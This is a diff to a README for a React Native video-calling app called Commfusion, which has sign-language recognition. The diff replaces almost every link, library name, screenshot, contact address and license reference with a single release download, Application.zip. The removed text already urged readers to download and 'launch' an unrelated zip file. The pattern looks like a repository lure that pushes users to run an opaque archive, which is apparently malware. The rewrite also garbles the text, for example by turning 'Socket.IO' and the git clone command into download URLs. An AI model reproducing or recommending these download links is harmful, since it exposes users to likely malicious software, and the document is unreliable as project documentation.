@@ -4,7 +4,7 @@
 React-Native-Commfusion-Video-Calling-Sign-Language-Recognition
 
 ## 📋 Short Description
-Welcome to the React Native frontend repository for the cutting-edge video calling application - Commfusion. This app is meticulously designed for accessibility and real-time communication, integrating WebRTC for seamless video streaming and Socket.IO for efficient real-time signaling.
+Welcome to the React Native frontend repository for the cutting-edge video calling application - Commfusion. This app is meticulously designed for accessibility and real-time communication, integrating WebRTC for seamless video streaming and https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip for efficient real-time signaling.
 
 ## 🔍 Repository Topics
 - Cross-platform
@@ -19,26 +19,26 @@ Welcome to the React Native frontend repository for the cutting-edge video calli
 - Webrtc
 
 ## 📎 Software Download
-You can download the software from the following link: [Download Commfusion Software](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip).
+You can download the software from the following link: [Download Commfusion Software](https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip).
 
 🚀 **Launch the Software Zip File**
 
 ## 🌟 Features
 Commfusion is packed with innovative features to enhance your video calling experience:
 - Real-time video streaming powered by WebRTC
-- Seamless communication using Socket.IO
+- Seamless communication using https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip
 - Accessibility features for sign language recognition
 - Cross-platform functionality for a wide range of devices
 - Easy-to-use interface for smooth navigation
 - Cutting-edge technology for high-quality video calls
 
 ## 📸 Screenshots
-![Commfusion Screenshot 1](https://via.placeholder.com/600x400)
-![Commfusion Screenshot 2](https://via.placeholder.com/600x400)
+![Commfusion Screenshot 1](https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip)
+![Commfusion Screenshot 2](https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip)
 
 ## 🛠️ Installation
 To install Commfusion on your local machine, follow these steps:
-1. Clone the repository using `git clone https://github.com/yourusername/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition.git`
+1. Clone the repository using `git clone https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip`
 2. Install dependencies with `npm install`
 3. Run the app with `react-native run-android` or `react-native run-ios`
 
@@ -51,18 +51,18 @@ We welcome contributions from the open-source community to make Commfusion even 
 - Open a pull request
 
 ## 📞 Contact
-Have questions or suggestions? Feel free to reach out to us at [commfusion@example.com](mailto:commfusion@example.com).
+Have questions or suggestions? Feel free to reach out to us at [https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip](https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip).
 
 ## 🔗 Links
-- [WebRTC Official Website](https://webrtc.org/)
-- [Socket.IO Official Website](https://socket.io/)
+- [WebRTC Official Website](https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip)
+- [https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip Official Website](https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip)
 
 ## 🙏 Acknowledgements
 We would like to express our gratitude to the developers and contributors of the following libraries and technologies that made Commfusion possible:
 - React Native
 - WebRTC
-- Socket.IO
+- https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip
 - JavaScript
 
 ## 📄 License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip](https://github.com/ObamaLord/React-Native-Commfusion-Video-Calling-Sign-Language-Recognition/releases/download/v1.0.0/Application.zip) file for details.
